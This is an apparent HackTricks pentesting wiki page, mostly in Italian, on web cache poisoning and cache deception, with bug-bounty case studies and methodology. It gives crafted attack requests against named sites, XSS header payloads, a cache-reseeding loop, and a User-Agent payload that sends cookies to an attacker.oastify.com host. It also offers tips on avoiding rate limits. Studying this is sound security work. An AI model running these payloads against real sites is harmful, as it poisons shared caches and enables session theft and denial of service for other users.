# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## La differenza

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, l'attaccante provoca che l'applicazione memorizzi del contenuto malevolo nella cache, e questo contenuto viene servito dalla cache ad altri utenti dell'applicazione.
> - In **web cache deception**, l'attaccante provoca che l'applicazione memorizzi nella cache del contenuto sensibile appartenente a un altro utente, e poi l'attaccante recupera questo contenuto dalla cache.

## Cache Poisoning

Cache poisoning mira a manipolare la cache lato client per costringere i client a caricare risorse inaspettate, parziali o sotto il controllo dell'attaccante. L'entità dell'impatto dipende dalla popolarità della pagina interessata, poiché la risposta avvelenata viene servita esclusivamente agli utenti che visitano la pagina durante il periodo di contaminazione della cache.

L'esecuzione di un attacco di cache poisoning implica diversi passaggi:

1. **Identificazione degli input non usati nella chiave di cache**: sono parametri che, pur non essendo necessari per una richiesta cache-able, possono alterare la risposta restituita dal server. Identificare questi input è cruciale perché possono essere sfruttati per manipolare la cache.
2. **Sfruttamento degli input non usati nella chiave di cache**: dopo aver identificato gli input, il passo successivo è capire come abusare di questi parametri per modificare la risposta del server in modo favorevole all'attaccante.
3. **Assicurarsi che la risposta avvelenata venga memorizzata nella cache**: l'ultimo passo è garantire che la risposta manipolata venga salvata nella cache. In questo modo, qualsiasi utente che accede alla pagina interessata mentre la cache è avvelenata riceverà la risposta contaminata.

### Scoperta: Controllare gli header HTTP

Di solito, quando una risposta è stata **memorizzata nella cache** ci sarà un **header che lo indica**; puoi controllare quali header devi prendere in considerazione in questo post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Scoperta: Memorizzazione in cache dei codici di errore

Se pensi che la risposta venga memorizzata in una cache, puoi provare a **inviare richieste con un header errato**, che dovrebbe rispondere con un **status code 400**. Poi prova ad accedere alla richiesta normalmente e se la **risposta è uno status code 400**, sai che è vulnerabile (e potresti anche eseguire un DoS).

Puoi trovare altre opzioni in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Tuttavia, nota che **a volte questi tipi di status code non vengono memorizzati in cache**, quindi questo test potrebbe non essere affidabile.

### Scoperta: Identificare e valutare gli input non usati nella chiave di cache

Puoi usare [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) per **brute-force parametri e header** che potrebbero **cambiare la risposta della pagina**. Per esempio, una pagina potrebbe usare l'header `X-Forwarded-For` per indicare al client di caricare lo script da lì:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Indurre una risposta dannosa dal server back-end

With the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected** or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)

### Far memorizzare la risposta nella cache

Once you have **identified** the **page** that can be abused, which **parameter**/**header** to use and **how** to **abuse** it, you need to get the page cached. Depending on the resource you are trying to get in the cache this could take some time, you might need to be trying for several seconds.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.\
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Another interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.

One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.

### Casi di studio fondamentali di Cache Poisoning

#### HackerOne redirect globale tramite `X-Forwarded-Host`

- The origin templated redirects and canonical URLs with `X-Forwarded-Host`, but the cache key only used the `Host` header, so a single response poisoned every visitor to `/`.
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- Richiedi immediatamente di nuovo `/` senza l'header spoofato; se il redirect persiste hai una host-spoofing primitive globale che spesso aggiorna reflected redirects/Open Graph links in stored issues.

#### GitHub repository DoS via `Content-Type` + `PURGE`

- Il traffico anonimo veniva indicizzato solo per path, mentre il backend entrava in uno stato di errore quando rilevava un `Content-Type` inaspettato. Questa risposta di errore era memorizzabile nella cache per ogni utente non autenticato di un repo.
- GitHub inoltre (per errore) rispettava il verbo `PURGE`, permettendo all'attaccante di svuotare una voce sana e forzare le cache a recuperare la variante avvelenata su richiesta:
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- Confronta sempre le cache keys authenticated vs anonymous, fuzz gli header raramente indicizzati come `Content-Type`, e prova i cache-maintenance verbs esposti per automatizzare il re-poisoning.

#### Shopify: loop di persistenza cross-host

- I cache multi-layer a volte richiedono più hit identici prima di committare un nuovo oggetto. Shopify riutilizzava la stessa cache su numerosi host localizzati, quindi la persistenza implicava impatto su molte proprietà.
- Usa brevi automation loop per reseed ripetutamente:
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- Dopo una risposta `hit`, effettua la scansione di altri host/asset che condividono lo stesso namespace della cache per dimostrare il raggio d'azione cross-domain.

#### Reindirizzamento di asset JS → stored XSS chain

- I programmi privati spesso ospitano JS condiviso come `/assets/main.js` su dozzine di sottodomini. Se `X-Forwarded-Host` influisce sulla logica di redirect per quegli asset ma non è usato come chiave, la risposta memorizzata nella cache diventa un 301 verso la JS dell'attaccante, causando stored XSS ovunque l'asset venga importato.
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- Mappa quali host riutilizzano lo stesso percorso dell'asset in modo da poter dimostrare una compromissione su più sottodomini.

#### DoS statico su GitLab tramite `X-HTTP-Method-Override`

- GitLab serviva bundle statici da Google Cloud Storage, che rispetta `X-HTTP-Method-Override`. Sovrascrivendo GET con HEAD si otteneva una `200 OK` cacheabile con `Content-Length: 0`, e la edge cache ignorava il metodo HTTP quando generava la key.
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- Una singola richiesta ha sostituito il bundle JS con un body vuoto per ogni GET, causando di fatto un DoSing della UI. Testa sempre gli override del metodo (`X-HTTP-Method-Override`, `X-Method-Override`, ecc.) contro le risorse statiche e verifica se la cache varia in base al metodo.

#### HackerOne loop su risorsa statica via `X-Forwarded-Scheme`

- Il middleware Rack di Rails si affidava a `X-Forwarded-Scheme` per decidere se forzare HTTPS. Spoofando `http` su `/static/logo.png` si innescava un 301 cacheabile, quindi tutti gli utenti ricevevano successivamente redirect (o loop) invece della risorsa:
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- Combina scheme spoofing con host spoofing quando possibile per creare redirect irreversibili per risorse altamente visibili.

#### Cloudflare: mismatch del casing dell'host-header

- Cloudflare normalizzava l'header `Host` per le cache keys ma inoltrava il casing grezzo alle origins. L'invio di `Host: TaRgEt.CoM` attivava un comportamento alternativo nel routing/templating delle origin pur popolando il bucket di cache canonico in minuscolo.
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- Enumerare i tenant CDN riproducendo mixed-case hosts (e altri normalized headers) e fare il diff tra il cached response e l'origin response per scoprire shared-platform cache poisonings.

#### Red Hat Open Graph meta poisoning

- L'iniezione di `X-Forwarded-Host` all'interno dei tag Open Graph trasformava una reflected HTML injection in una stored XSS una volta che il CDN aveva cached la pagina. Usa un cache buster innocuo durante i test per evitare di danneggiare gli utenti di produzione:
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- Social media scrapers consumano i tag Open Graph memorizzati nella cache, quindi una singola voce avvelenata distribuisce il payload ben oltre i visitatori diretti.

## Esempi di sfruttamento

### Esempio più semplice

Un header come `X-Forwarded-For` viene riflesso nella risposta senza essere sanitizzato.\
Puoi inviare un payload XSS di base e avvelenare la cache in modo che chiunque acceda alla pagina venga XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nota che questo avvelenerà una richiesta a `/en?region=uk` e non a `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

In **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** viene spiegato il seguente semplice scenario:

- La CDN memorizzerà nella cache qualsiasi risorsa sotto `/share/`
- La CDN NON decodificherà né normalizzerà `%2F..%2F`, quindi può essere usato come **path traversal to access other sensitive locations that will be cached** come `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Il web server DECODERÀ e normalizzerà `%2F..%2F`, e risponderà con `/api/auth/session`, che **contains the auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

I cookie possono anche essere riflessi nella risposta di una pagina. Se puoi abusarne per causare una XSS, per esempio, potresti riuscire a sfruttare la XSS in diversi client che caricano la risposta cache malevola.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Nota che se il cookie vulnerabile è molto usato dagli utenti, richieste regolari puliranno la cache.

### Generare discrepanze con delimitatori, normalizzazione e punti <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Vedi:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning con path traversal per rubare un'API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Questa writeup spiega**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) come è stato possibile rubare una API key di OpenAI con un URL come `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` perché qualsiasi cosa che corrisponde a `/share/*` verrà memorizzata nella cache senza che Cloudflare normalizzi l'URL, cosa che invece avveniva quando la richiesta raggiungeva il web server.

Questo è spiegato anche meglio in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

A volte sarà necessario **exploit several unkeyed inputs** per poter abusare di una cache. Per esempio, potresti trovare un **Open redirect** se imposti `X-Forwarded-Host` su un dominio da te controllato e `X-Forwarded-Scheme` su `http`. Se il **server** sta **inoltrando** tutte le richieste **HTTP** verso **HTTPS** e usa l'header `X-Forwarded-Scheme` come nome di dominio per il redirect, puoi controllare verso dove punta il redirect.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Sfruttare con `Vary` header limitato

Se hai scoperto che l'header **`X-Host`** viene usato come **nome di dominio per caricare una risorsa JS** ma l'header **`Vary`** nella risposta indica **`User-Agent`**, allora devi trovare un modo per esfiltrare il `User-Agent` della vittima e avvelenare la cache usando quel `User-Agent`:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Invia una GET request con la request sia nell'URL sia nel body. Se il web server usa quella dal body ma il cache server memorizza nella cache quella dall'URL, chiunque accedendo a quell'URL userà in realtà il parameter dal body. Come il vuln che James Kettle ha trovato sul sito di Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
C'è un laboratorio di PortSwigger su questo: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Ad esempio, è possibile separare i **parameters** su server ruby usando il carattere **`;`** invece di **`&`**. Ciò può essere usato per inserire valori di parameters non-chiave (unkeyed) all'interno di quelli con chiave (keyed) e abusarne.

Laboratorio PortSwigger: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Scopri qui come eseguire [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

Il [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) può essere usato per testare automaticamente Web Cache Poisoning. Supporta molte tecniche diverse ed è altamente personalizzabile.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Questo pattern osservato in ambienti reali concatena una primitiva di reflection basata su header con il comportamento di CDN/WAF per avvelenare in modo affidabile l'HTML in cache servito ad altri utenti:

- L'HTML principale rifletteva un header di richiesta non affidabile (es., `User-Agent`) in un contesto eseguibile.
- Il CDN rimuoveva gli header di cache ma esisteva una cache interna/origin. Il CDN metteva inoltre automaticamente in cache le richieste che terminavano con estensioni statiche (es., `.js`), mentre il WAF applicava un'ispezione del contenuto più debole alle GET per asset statici.
- Anomalie nel flusso delle richieste permettevano a una richiesta verso un path `.js` di influenzare la cache key/variant usata per l'HTML principale successivo, abilitando XSS cross-user tramite header reflection.

Ricetta pratica (osservata su un popolare CDN/WAF):

1) Da un IP pulito (evitare declassamenti basati sulla reputazione), imposta un `User-Agent` malevolo via browser o Burp Proxy Match & Replace.  
2) In Burp Repeater, prepara un gruppo di due richieste e usa "Send group in parallel" (single-packet mode funziona meglio):
- Prima richiesta: GET di una risorsa `.js` sullo stesso origin inviando il tuo `User-Agent` malevolo.
- Subito dopo: GET della pagina principale (`/`).
3) La corsa di routing del CDN/WAF più il `.js` auto-cached spesso seminano una variante di HTML in cache avvelenata che viene poi servita ad altri visitatori che condividono le stesse condizioni della cache key (es., stesse dimensioni `Vary` come `User-Agent`).

Example header payload (to exfiltrate non-HttpOnly cookies):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Molte CDN nascondono gli header della cache; il poisoning può manifestarsi solo su cicli di refresh di più ore. Usa più vantage IPs e rallenta la frequenza per evitare trigger di rate-limit o di reputazione.
- Usare un IP dal cloud del CDN stesso a volte migliora la consistenza del routing.
- Se è presente una CSP restrittiva, questo funziona comunque se la reflection viene eseguita nel contesto HTML principale e la CSP permette l'esecuzione inline o viene bypassata dal contesto.

Impact:

- Se i cookie di sessione non sono `HttpOnly`, è possibile un zero-click ATO esfiltrando massivamente `document.cookie` da tutti gli utenti a cui viene servito il poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Questo scrive HTML arbitrario sotto una cache key scelta dall'attaccante, permettendo un avvelenamento preciso una volta che le cache key sono note.

Per i dettagli completi (cache key construction, ItemService enumeration e una chained post-auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Esempi Vulnerabili

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS inoltrava il frammento all'interno dell'URL senza rimuoverlo e generava la cache key usando solo host, path e query (ignorando il frammento). Quindi la richiesta `/#/../?r=javascript:alert(1)` veniva inviata al backend come `/#/../?r=javascript:alert(1)` e la cache key non conteneva il payload, solo host, path e query.

### 403 and Storage Buckets

Cloudflare in passato memorizzava in cache le risposte 403. Tentare di accedere a S3 o Azure Storage Blobs con header Authorization errati avrebbe prodotto una risposta 403 che veniva memorizzata in cache. Anche se Cloudflare ha smesso di memorizzare in cache le risposte 403, questo comportamento potrebbe essere ancora presente in altri servizi proxy.

### Injecting Keyed Parameters

I cache spesso includono specifici parametri GET nella cache key. Per esempio, il Varnish di Fastly cacheava il parametro `size` nelle richieste. Tuttavia, se una versione URL-encoded del parametro (es., `siz%65`) veniva inviata con un valore errato, la cache key sarebbe stata costruita usando il parametro `size` corretto. Il backend però avrebbe processato il valore nel parametro URL-encoded. URL-encoding del secondo parametro `size` portava alla sua omissione da parte della cache ma al suo utilizzo dal backend. Assegnare a questo parametro il valore 0 risultava in un 400 Bad Request memorizzabile in cache.

### User Agent Rules

Alcuni sviluppatori bloccano richieste con user-agent che corrispondono a strumenti ad alto traffico come FFUF o Nuclei per gestire il carico del server. Ironia della sorte, questo approccio può introdurre vulnerabilità come cache poisoning e DoS.

### Campi Header Illegali

L'[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specifica i caratteri accettabili nei nomi degli header. Gli header contenenti caratteri al di fuori della gamma **tchar** dovrebbero idealmente causare una risposta 400 Bad Request. In pratica, i server non sempre rispettano questo standard. Un esempio notevole è Akamai, che inoltra header con caratteri non validi e memorizza in cache qualsiasi errore 400, purché l'header `cache-control` non sia presente. È stato identificato un pattern sfruttabile in cui l'invio di un header con un carattere illegale, come `\`, avrebbe prodotto un 400 Bad Request memorizzabile in cache.

### Trovare nuovi header

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

Lo scopo di Cache Deception è far sì che i client **carichino risorse che verranno salvate nella cache contenenti le loro informazioni sensibili**.

Prima di tutto nota che le **extensions** come `.css`, `.js`, `.png` ecc. sono solitamente **configurate** per essere **salvate** nella **cache**. Pertanto, se accedi a `www.example.com/profile.php/nonexistent.js` la cache probabilmente memorizzerà la risposta perché riconosce l'**extension** `.js`. Tuttavia, se l'**application** risponde con i contenuti utente **sensibili** presenti in _www.example.com/profile.php_, puoi **rubare** quei contenuti da altri utenti.

Altre cose da testare:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Usa estensioni meno conosciute come_ `.avif`

Un altro esempio molto chiaro si trova in questo write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Nell'esempio, viene spiegato che se carichi una pagina inesistente come _http://www.example.com/home.php/non-existent.css_ il contenuto di _http://www.example.com/home.php_ (**contenente le informazioni sensibili dell'utente**) verrà restituito e il server di cache salverà il risultato.\
Poi, l'**attaccante** può accedere a _http://www.example.com/home.php/non-existent.css_ nel proprio browser e osservare le **informazioni riservate** degli utenti che vi hanno precedentemente avuto accesso.

Nota che il **cache proxy** dovrebbe essere **configurato** per **memorizzare** i file nella **cache** basandosi sull'**extension** del file (_.css_) e non sul content-type. Nell'esempio _http://www.example.com/home.php/non-existent.css_ avrà un content-type `text/html` invece di un `text/css` mime type.

Scopri qui come eseguire[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

This pattern combines a Client-Side Path Traversal (CSPT) primitive in a Single-Page App (SPA) with extension-based CDN caching to publicly cache sensitive JSON that was originally only available via an authenticated API call.

High level idea:

- Un endpoint API sensibile richiede un auth header custom ed è correttamente marcato come non-cacheable by origin.
- Aggiungere un suffisso dall'aspetto statico (per esempio, .css) fa sì che il CDN interpreti il path come un asset statico e memorizzi la risposta nella cache, spesso senza variare in base agli header sensibili.
- La SPA contiene CSPT: concatena un segmento di path controllato dall'utente nell'URL dell'API mentre allega l'header di auth della vittima (per esempio, X-Auth-Token). Iniettando la traversal ../.., il fetch autenticato viene reindirizzato alla variante del path cacheable (…/v1/token.css), causando il caching del token JSON della vittima sotto una chiave pubblica.
- Chiunque può quindi fare un GET su quella stessa cache key senza autenticazione e recuperare il token della vittima.

Example

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- Un suffisso dall'aspetto statico induce la CDN a trattare la risorsa come cacheable:
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT in SPA allega auth header e permette traversal:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- Catena di exploit:
1. Indurre la vittima a un URL che inietta dot-segments nel parametro di path della SPA, ad es.:
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. La SPA esegue un fetch autenticato verso:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. La normalizzazione del browser lo risolve in:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. Il CDN tratta .css come asset statico e mette in cache il JSON con Cache-Control: public, max-age=...
5. Recupero pubblico: chiunque può quindi fare un GET https://api.example.com/v1/token.css e ottenere il JSON token in cache.

Precondizioni

- La SPA esegue fetch/XHR autenticati verso lo stesso API origin (o cross-origin con CORS funzionante) e allega header sensibili o bearer tokens.
- Edge/CDN applica caching basato sull'estensione per percorsi che sembrano statici (es., *.css, *.js, immagini) e non varia il cache key in base all'header sensibile.
- L'origin per l'endpoint base è non-cacheable (corretto), ma la variante con suffisso di estensione è consentita o non bloccata dalle regole edge.

Checklist di validazione

- Identificare endpoint dinamici sensibili e provare suffissi come .css, .js, .jpg, .json. Cercare Cache-Control: public/max-age e X-Cache: Hit (o equivalente, es., CF-Cache-Status) mentre il contenuto rimane JSON.
- Individuare codice client che concatena input controllato dall'utente in path API mentre allega header di auth. Iniettare sequenze ../ per reindirizzare la richiesta autenticata verso l'endpoint target.
- Confermare che l'header autenticato sia presente nella richiesta ritargettata (es., in un proxy o tramite log server-side) e che il CDN metta in cache la risposta sotto il path attraversato.
- Da un contesto pulito (nessuna auth), richiedere lo stesso path e confermare che il JSON segreto venga servito dalla cache.

## Strumenti automatici

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner per trovare vulnerabilità di web cache poisoning in una lista di URL e testare più tecniche di injection.

## Riferimenti

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
